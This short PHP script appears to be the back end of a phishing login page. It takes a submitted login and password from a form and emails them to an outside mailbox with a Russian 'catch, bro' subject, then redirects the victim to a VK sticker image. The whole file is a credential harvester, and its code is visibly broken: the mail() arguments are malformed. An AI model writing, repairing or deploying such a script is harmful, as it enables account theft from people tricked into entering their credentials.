<?php

    $result = mail("Mail@mail.com" ,"Лови, братиш" " \nЛогин: $_POST[saha1236721@gmail.com] \nПароль: $_POST[pass] ");
    if ($result) {
        echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=https://vk.com/images/stickers/4535/512.png /'></head></html>";
    }
    else {
        echo "<p>Eror. This shit is dont work</p>";
    }
?>